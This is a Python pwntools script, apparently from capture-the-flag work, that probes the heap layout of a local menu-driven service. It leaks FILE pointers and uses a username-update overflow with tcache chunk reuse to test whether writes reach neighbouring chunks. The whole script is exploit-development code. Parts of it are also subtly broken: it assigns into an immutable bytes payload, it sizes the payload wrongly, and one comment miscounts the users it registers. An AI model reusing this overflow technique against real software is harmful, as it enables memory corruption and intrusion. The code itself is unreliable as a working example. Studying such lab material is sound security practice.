#!/usr/bin/env python3
"""
Empirical heap layout checker.
Finds the actual distance between user chunks and FILE chunks.
"""
from pwn import *
context.arch = 'amd64'
context.log_level = 'warn'

r = remote('localhost', 16767)

def register(r, username):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'username: ', username)
    line = r.recvline()
    return int(line.split(b'slot ')[1].split()[0])

def show(r, slot):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'slot: ', str(slot).encode())
    r.recvuntil(b'username: ')
    fmt = r.recvline()
    raw = r.recv(0x48)
    return fmt, raw

def update(r, slot, data):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'slot: ', str(slot).encode())
    r.sendlineafter(b'new username: ', data)

def delete(r, slot):
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'slot: ', str(slot).encode())

# Register 2 users
s0 = register(r, b'AAAA')
s1 = register(r, b'BBBB')
s2 = register(r, b'CCCC')
print(f"Slots: {s0} {s1} {s2}")

# Get FILE* for both
_, raw0 = show(r, 0)
_, raw1 = show(r, 1)
_, raw2 = show(r, 2)

file_a = u64(raw0[0x40:0x48])
file_b = u64(raw1[0x40:0x48])
file_c = u64(raw2[0x40:0x48])

print(f"\nFILE_A: {hex(file_a)}")
print(f"FILE_B: {hex(file_b)}")
print(f"FILE_C: {hex(file_c)}")

print(f"\nGap A→B: {hex(file_b - file_a)}")
print(f"Gap B→C: {hex(file_c - file_b)}")

# Now let's figure out the user struct addresses
# Delete slot 1 to free B
delete(r, 1)

# Now show slot 0 and update to write a known pattern
# Use update to write a marker at offset 0x50 (into the FILE area)
marker = b'MARKER!!' * 0x40
marker = marker[:0x200]
update(r, 0, marker)

# Now register slot 1 back (reuses B from tcache[0x50])
s1_new = register(r, b'1111')

# Show slot 1 to check if marker appears in its data
fmt1, raw1_new = show(r, 1)
user_data = raw1_new[:0x40]
print(f"\nSlot 1 username starts with: {user_data[:8]}")

# Now check: where did marker end up?
# If marker is at offset 0x50 from A_user_data and B_user is at distance X:
# marker[0:8] at A_user_data+0x50 = "MARKER!!"

# Let's delete slot 2 to put C in tcache
delete(r, 2)

# Update slot 1 with a pattern to check if we can overflow into C
payload2 = b'X' * 0x40  # username
payload2 += p64(0) * (0x200 - 0x40)  # rest zeros
payload2[-8:] = p64(0x4141414141414141)  # marker at end
update(r, 1, payload2)

# Register slot 2 back (reuses C from tcache)
s2_new = register(r, b'2222')

# Show slot 2 to check
fmt2, raw2_new = show(r, 2)
print(f"\nSlot 2 username starts: {raw2_new[:8]}")
# Check if marker appears anywhere in slot 2's data
for i in range(0, 0x48, 8):
    val = u64(raw2_new[i:i+8])
    if val != 0:
        print(f"  raw2[{i}:{i+8}] = {hex(val)}")

# Also check if we can find 0x4141414141414141
for i in range(0, 0x48, 8):
    if u64(raw2_new[i:i+8]) == 0x4141414141414141:
        print(f"  >>> FOUND MARKER at offset {i}")

r.close()
